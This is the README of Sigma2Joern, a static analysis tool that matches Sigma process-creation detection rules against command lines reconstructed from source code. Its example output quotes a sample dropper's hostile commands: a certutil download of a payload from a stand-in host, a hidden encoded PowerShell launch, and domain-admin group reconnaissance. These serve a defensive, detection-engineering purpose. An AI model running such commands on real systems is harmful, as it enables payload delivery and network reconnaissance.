# Sigma2Joern

**Which lines of this code base would set off our SOC if they ran?**

Sigma2Joern answers that question statically. It uses [Joern](https://joern.io) to find every place where code starts a process, reconstructs the command line as far as the code reveals it, and evaluates [Sigma](https://github.com/SigmaHQ/sigma) `process_creation` rules against these *synthetic process events*. Nothing gets executed.

Typical uses:

* **Supply-chain and PoC triage.** Before you run a GitHub exploit PoC, an npm package or a script from a ticket, check whether it runs `certutil -urlcache`, `powershell -enc`, `curl … | sh` and the like.
* **Pre-deployment check of in-house software.** Find out whether your own installers, admin scripts or agents will trigger your SIEM rules, so you can fix them or prepare a documented exception *before* rollout.
* **Detection coverage.** Feed it the source of a red-team tool and see which of your rules would fire, and which tradecraft no rule covers.

## How it works

```
source code ──joern-parse──▶ CPG ──extract_events.sc──▶ events.json ──sigma2joern (pySigma)──▶ findings
                                   (Joern, generic)                    (Python, all rules at once)
```

1. **Extraction (Joern).** `sigma2joern/joern/extract_events.sc` exports every call to a process-creating API, together with a *value tree* for each argument: literals, the reaching assignments of variables (including C buffer writes such as `strcpy`/`strcat`/`snprintf`), the arguments passed at call sites of parameters, string concatenation, f-strings and template literals, `printf`-style formatting, lists and arrays. The script is static. It is not generated from rules, so rule content can never inject code.
2. **Static Sysmon.** For each call site, Sigma2Joern emulates what Sysmon/EDR would log: `Image`, `CommandLine` and `OriginalFileName`. Shell invocations (`system()`, `shell=True`, `child_process.exec`, …) produce the shell process (`cmd.exe /c …`, `sh -c …`, in the exact form each runtime uses) and every command it starts. Commands are split at `&&`, `||`, `|`, `;` and `&`, and nested shells are followed.
3. **Three-valued Sigma evaluation.** Rules are parsed with **pySigma**, so all modifiers work (`contains`, `all`, `windash`, `base64offset`, `re`, `cidr`, `fieldref`, …), as do conditions with `and/or/not`, `1 of`/`all of`, and filters. What the code does not reveal stays unknown, either as a gap in a string (`powershell -enc «…»`) or as an unknown field (`ParentImage`, `User`, …). Each rule is evaluated in Kleene logic. The result is one of these levels:

| Level | Meaning |
|---|---|
| `match` | The rule fires whatever the unknown values are. |
| `conditional` | The detection part matches; only exclusion filters on unknown runtime context (e.g. `not ParentImage|endswith: '\explorer.exe'`) could still suppress the alert. |
| `possible` | The result depends on unknown values in the detection part itself (hidden by default). |

The evaluation is *sound*: it never reports `match` if some runtime value could prevent the match, and it never drops a rule that some runtime value could trigger (see [Validation](#validation)).

## Installation

```bash
pip install -e .            # Python >= 3.11, installs pySigma
# Joern: https://docs.joern.io/installation  (joern must be on PATH, or pass --joern)
git clone https://github.com/SigmaHQ/sigma   # or use your own rule repository
```

## Usage

```bash
# one step: build the CPG, extract, match
sigma2joern scan --src ./suspicious-project -r sigma/rules

# or step by step
joern-parse ./suspicious-project -o cpg.bin
sigma2joern extract --cpg cpg.bin -o events.json
sigma2joern match events.json -r sigma/rules -r my-company-rules/
sigma2joern events events.json        # show the reconstructed process starts
```

Useful options for `match` and `scan`:

| Option | Purpose |
|---|---|
| `--min-level match\|conditional\|possible` | Lowest level to report (default `conditional`). |
| `--set Field=Value` | Known runtime context, e.g. `--set ParentImage=C:\Program Files\MyApp\app.exe` or `--set User=NT AUTHORITY\SYSTEM`. Turns `conditional` results into definite answers. |
| `--platform windows\|linux\|macos` | Only evaluate rules for these platforms. |
| `-f text\|json\|sarif`, `-o FILE` | Output format. SARIF works with GitHub code scanning and IDEs. |
| `--fail-on LEVEL` | Exit code 1 if a finding has at least this level (for CI). |
| `--no-path-assumption` | Do not assume that bare system programs (`whoami`, `cmd`, `powershell`, …) resolve to `C:\Windows\System32`. |

The extractor can also be run directly:

```bash
joern --script sigma2joern/joern/extract_events.sc --param cpgFile=cpg.bin --param outFile=events.json
```

## Example

Output for [`examples/samples/python/dropper.py`](examples/samples/python/dropper.py), run against the SigmaHQ rule set (shortened):

```
examples/samples/python/dropper.py:13  [subprocess]
    code: subprocess.run(["certutil.exe", "-urlcache", "-split", "-f", url, "C:\\Users\\Public\\p.txt"])
  MATCH    medium   Suspicious Download Via Certutil.EXE  (19b08b1c, windows)
           Image: C:\Windows\System32\certutil.exe
           CommandLine: certutil.exe -urlcache -split -f http://example.invalid/payload.txt C:\Users\Public\p.txt

examples/samples/python/dropper.py:20  [subprocess]
    code: subprocess.check_output(cmd, shell=True)
  MATCH    medium   Suspicious Group And Account Reconnaissance Activity Using Net.EXE  (d95de845, windows)
           Image: C:\Windows\System32\net.exe
           CommandLine: net group "domain admins" /domain

examples/samples/python/dropper.py:24  [subprocess]
    code: subprocess.Popen(f"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {payload}", shell=True)
  COND.    medium   Suspicious Execution of Powershell with Base64  (fb843269, windows)
           Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
           CommandLine: powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand «…»
           depends on: CommandLine, ParentImage
```

The URL comes from the module constant `DOWNLOAD_URL`, passed to the parameter `url` at a call site. The `net` command was built with `cmd = "net group"` and `cmd += ' "domain admins" /domain'`. Both values were resolved from the CPG.

## Supported languages and APIs

| Language (Joern frontend) | Process APIs |
|---|---|
| C/C++ (`c2cpg`), binaries (`ghidra2cpg`) | `system`, `popen`, `_wsystem`, `WinExec`, `CreateProcess*`, `ShellExecute*`, `exec*`, `_exec*`, `posix_spawn*`, `_spawn*` |
| Python (`pysrc2cpg`) | `os.system/popen/exec*/spawn*/startfile`, `subprocess.*` (incl. `shell=True`), `asyncio.create_subprocess_*`, `pty.spawn` |
| Java/Kotlin (`javasrc2cpg`, `jimple2cpg`, `kotlin2cpg`) | `Runtime.exec`, `ProcessBuilder` |
| JavaScript/TypeScript (`jssrc2cpg`) | `child_process.exec/execSync/execFile/spawn` (incl. `shell: true`) |
| PHP (`php2cpg`) | `exec`, `system`, `passthru`, `shell_exec`, backticks, `popen`, `proc_open`, `pcntl_exec` |
| Go, C#, Ruby | `exec.Command`, `syscall.Exec`; `Process.Start`; `system/exec/spawn`, `Open3` (best effort) |

## Limitations

* Only `process_creation` rules: 43 % of SigmaHQ (about 1,640 of 3,800 rules across all rule folders). Other log sources (file, registry, network, cloud …) are skipped; the sink table in `sinks.py` is the place to extend this.
* String reconstruction is intraprocedural plus one level of callers per parameter, and branch-insensitive. Values computed at runtime (configuration, network input, decoding) stay unknown.
* Fields that depend on the runtime environment (`ParentImage`, `User`, `IntegrityLevel`, hashes, PE metadata) are unknown unless given with `--set`. `OriginalFileName` is approximated by the executable's file name.
* The content of PowerShell script blocks and other interpreters is not analysed; only the process start itself is.
* Detection depends on how faithfully each Joern frontend represents the code; the Python side is covered by tests that mirror the frontends' output format.

## Validation

`tests/` contains unit and end-to-end tests (`pytest`). With a SigmaHQ checkout, `SIGMAHQ_DIR=/path/to/sigma pytest tests/test_sigmahq_regression.py` additionally checks the evaluator against SigmaHQ's regression data, which are real Sysmon events:

* 286/286 regression events match their rule when all fields are known (Sigma semantics are implemented correctly).
* With only `Image`, `CommandLine` and `OriginalFileName` known, which is what static analysis sees, no true positive is lost: 257 `match`, 14 `conditional`, 21 `possible`.
* With random parts of the command line replaced by gaps, every definite `match` holds for thousands of random fillings of those gaps.

## What changed in 0.2

Version 0.1 generated one Joern script per rule and used every string in the `detection` block as an OR'ed substring indicator. Against the SigmaHQ rules, that approach had these problems:

* 60 % of the generated scripts did not compile (79 % of the Windows `process_creation` rules). Backslashes such as `\powershell.exe` were not escaped in the Scala string literals, and quotes in titles or descriptions broke out of them.
* Every rule's `condition` string (e.g. `selection`) was itself used as an indicator.
* In 815 rules, filter values (`not filter`) became positive indicators.
* Field names, modifiers, AND logic and wildcards were ignored.
* The call filter `.*(system|exec|popen).*` missed `CreateProcess`, `ShellExecute`, `subprocess.run/Popen`, `ProcessBuilder` and `spawn`, but matched SQL calls such as `cursor.execute()`.
* Joern's data-flow information was not used.

## License

MIT, see [LICENSE](LICENSE).
